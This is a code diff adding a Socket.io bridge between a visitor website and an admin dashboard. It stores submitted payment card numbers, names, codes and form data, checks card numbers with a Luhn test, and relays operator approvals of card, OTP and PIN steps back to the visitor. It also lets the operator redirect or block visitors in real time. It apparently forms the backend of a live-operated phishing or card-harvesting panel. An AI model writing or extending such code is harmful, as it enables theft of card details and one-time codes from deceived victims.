@@ -428,6 +428,199 @@ io.on('connection', (socket) => {
     siteEnabled: db.siteSettings.siteEnabled,
   });
 
+  // ==================== Visitor Site Compatibility Bridge ====================
+  // Translates the visitor website events (visitor:register, more-info, ...)
+  // onto the existing data stores, so the admin dashboard sees visitor cards
+  // in realtime and admin decisions reach the visitor. Nothing above changes.
+  {
+    const getVisitorUuid = () => socket.visitorUuid || socket.uuid;
+
+    socket.on('visitor:register', (data) => {
+      const requested = (data && (data.visitorId || data.existingVisitorId)) || (socket.handshake && socket.handshake.query && socket.handshake.query.visitorId);
+      const uuid = (requested && String(requested).trim()) || uuidv4();
+      socket.visitorUuid = uuid;
+      if (!socket.uuid) socket.uuid = uuid;
+      if (!socket.userType) socket.userType = 'client';
+      socket.join(`user:${uuid}`);
+
+      const existing = db.connectedUsers[uuid] || {};
+      db.connectedUsers[uuid] = {
+        ...existing,
+        socketId: socket.id,
+        uuid,
+        userId: uuid,
+        userName: existing.userName || 'زائر',
+        userType: 'client',
+        userInfo: existing.userInfo || db.users[uuid] || {},
+        connectedAt: existing.connectedAt || new Date().toISOString(),
+        currentPage: existing.currentPage || null,
+        isOnline: true,
+        isTyping: false,
+        visitorId: uuid,
+      };
+      saveToFile();
+      socket.emit('successfully-connected', { sid: socket.id, pid: uuid });
+      socket.emit('isAdminConnected', Object.values(db.connectedUsers).some(u => u.userType === 'admin' && u.isOnline !== false));
+      broadcastConnectedUsers();
+      io.emit('user:statusUpdate', { uuid, userId: uuid, socketId: socket.id, status: 'online', currentPage: db.connectedUsers[uuid].currentPage || '' });
+    });
+
+    socket.on('visitor:pageEnter', (page) => {
+      const uuid = getVisitorUuid();
+      if (!uuid) return;
+      if (db.connectedUsers[uuid]) {
+        db.connectedUsers[uuid].currentPage = page;
+        db.connectedUsers[uuid].isOnline = true;
+      }
+      io.emit('user:statusUpdate', { uuid, userId: uuid, socketId: socket.id, currentPage: page, status: 'online', isTyping: false });
+      broadcastConnectedUsers();
+    });
+
+    socket.on('more-info', (data) => {
+      const uuid = (data && data.visitorId) || getVisitorUuid();
+      if (!uuid) return;
+      const content = (data && data.content) || {};
+      const paymentCard = (data && data.paymentCard) || {};
+      const formData = { ...content, ...paymentCard };
+      if (data.digitCode) formData.digitCode = data.digitCode;
+      const page = data.page || '';
+      const submission = {
+        id: uuidv4(),
+        uuid,
+        userId: uuid,
+        formType: content.formType || paymentCard.formType || (paymentCard.cardNumber ? 'payment' : 'booking'),
+        formData,
+        step: content.step || page,
+        page,
+        timestamp: new Date().toISOString(),
+        submittedAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      };
+      db.formSubmissions.push(submission);
+
+      const name = formData.name || formData.fullName || formData.documentOwnerName || formData.cardholderName || formData.ownerName || '';
+      if (!db.connectedUsers[uuid]) {
+        db.connectedUsers[uuid] = { socketId: socket.id, uuid, userId: uuid, userType: 'client', userInfo: {}, connectedAt: new Date().toISOString(), isOnline: true };
+      }
+      const u = db.connectedUsers[uuid];
+      if (name) u.userName = name;
+      u.currentPage = data.waitingForAdminResponse ? 'بانتظار القرار...' : page;
+      u.isWaiting = !!data.waitingForAdminResponse;
+      u.waitingFormType = data.waitingForAdminResponse ? submission.formType : null;
+      u.isOnline = true;
+      u.userInfo = { ...u.userInfo, ...formData };
+      saveToFile();
+
+      io.emit('form:submission', submission);
+      io.emit('user:statusUpdate', { uuid, userId: uuid, socketId: socket.id, currentPage: u.currentPage, status: 'online', isTyping: false, isWaiting: u.isWaiting, waitingFormType: u.waitingFormType });
+      broadcastConnectedUsers();
+      addLiveUpdate('form_submission', { uuid, formType: submission.formType, step: submission.step });
+    });
+
+    socket.on('chat:fromVisitor', (data) => {
+      const uuid = getVisitorUuid() || (data && data.visitorId);
+      if (!uuid || !data) return;
+      const msg = { id: uuidv4(), uuid, userId: uuid, from: 'visitor', message: data.message, timestamp: data.timestamp || new Date().toISOString() };
+      if (!db.chatMessages[uuid]) db.chatMessages[uuid] = [];
+      db.chatMessages[uuid].push(msg);
+      saveToFile();
+      io.emit('chat:message', msg);
+    });
+
+    socket.on('whatsapp:get', () => {
+      socket.emit('whatsapp:update', db.siteSettings.whatsappNumber || db.siteSettings.whatsapp || '');
+    });
+
+    if (!db.blockedCards) db.blockedCards = [];
+    socket.on('blockedCards:get', () => {
+      socket.emit('blockedCards:list', db.blockedCards);
+    });
+
+    socket.on('cardNumber:verify', (cardNumber) => {
+      const digits = String(cardNumber || '').replace(/\D/g, '');
+      let sum = 0, dbl = false;
+      for (let i = digits.length - 1; i >= 0; i--) {
+        let d = +digits[i];
+        if (dbl) { d *= 2; if (d > 9) d -= 9; }
+        sum += d; dbl = !dbl;
+      }
+      const valid = digits.length >= 12 && sum % 10 === 0;
+      const blocked = db.blockedCards.some(c => digits.startsWith(String(c).replace(/\D/g, '')));
+      if (blocked) socket.emit('card:duplicateRejected');
+      else if (valid) socket.emit('card:verified');
+    });
+
+    // ---- Admin action relays: forward dashboard decisions to the visitor ----
+    socket.on('admin:updateFormSubmission', (data) => {
+      const { uuid, userId, update, action, actionType } = data || {};
+      const targetUuid = uuid || userId;
+      if (!targetUuid) return;
+      const room = `user:${targetUuid}`;
+      const formType = actionType || (update && (update.crdconfirm !== undefined ? 'payment' : update.otpconfirm !== undefined ? 'otp_verification' : update.pinconfirm !== undefined ? 'pin_verification' : undefined));
+      if (update && update.verificationCode) {
+        io.to(room).emit('code', String(update.verificationCode));
+      }
+      if (action === 'confirmed' || (update && (update.crdconfirm === 1 || update.otpconfirm === 1 || update.pinconfirm === 1 || update.phoneconfirm === 1))) {
+        io.to(room).emit('form:approved');
+        if (formType === 'payment') io.to(room).emit('card:verified');
+        io.to(room).emit('card:action', 'confirmed');
+        io.to(room).emit('code:action', { action: 'confirmed', codeIndex: 0 });
+      }
+      if (action === 'cancelled' || (update && (update.crdconfirm === -1 || update.otpconfirm === -1 || update.pinconfirm === -1 || update.phoneconfirm === -1))) {
+        io.to(room).emit('form:rejected');
+        io.to(room).emit('card:action', 'cancelled');
+        io.to(room).emit('code:action', { action: 'cancelled', codeIndex: 0 });
+      }
+    });
+
+    socket.on('admin:redirectUser', (data) => {
+      const { uuid, userId, page, pageName, url } = data || {};
+      const targetUuid = uuid || userId;
+      const target = page || pageName || url;
+      if (targetUuid && target) io.to(`user:${targetUuid}`).emit('visitor:navigate', String(target).replace(/^\//, ''));
+    });
+
+    socket.on('admin:blockUser', (data) => {
+      const targetUuid = data && (data.uuid || data.userId);
+      if (targetUuid) io.to(`user:${targetUuid}`).emit('blocked');
+    });
+
+    socket.on('admin:unblockIp', (data) => {
+      const targetUuid = data && (data.uuid || data.userId);
+      if (targetUuid) io.to(`user:${targetUuid}`).emit('unblocked');
+    });
+
+    const relayDeleted = (data) => {
+      const targetUuid = data && (data.uuid || data.userId);
+      if (targetUuid) io.to(`user:${targetUuid}`).emit('deleted');
+    };
+    socket.on('admin:deleteUserSession', relayDeleted);
+    socket.on('admin:deleteConnectedUser', relayDeleted);
+
+    socket.on('chat:message', (data) => {
+      if (data && data.from === 'admin') {
+        const targetUuid = data.targetUuid || data.uuid;
+        if (targetUuid) {
+          io.to(`user:${targetUuid}`).emit('chat:fromAdmin', { message: data.message, timestamp: data.timestamp || new Date().toISOString() });
+        }
+      }
+    });
+
+    // Track admin presence for the visitor site's isAdminConnected indicator
+    socket.on('user:join', (data) => {
+      if (data && data.userType === 'admin') {
+        io.emit('isAdminConnected', true);
+      }
+    });
+    socket.on('disconnect', () => {
+      if (socket.userType === 'admin') {
+        const anyAdmin = Object.values(db.connectedUsers).some(u => u.userType === 'admin' && u.isOnline !== false && u.socketId !== socket.id);
+        if (!anyAdmin) io.emit('isAdminConnected', false);
+      }
+    });
+  }
+  // ==================== End Visitor Site Compatibility Bridge ====================
+
   // ==================== User Events ====================
   socket.on('user:join', (data) => {
     const rawData = data || {};
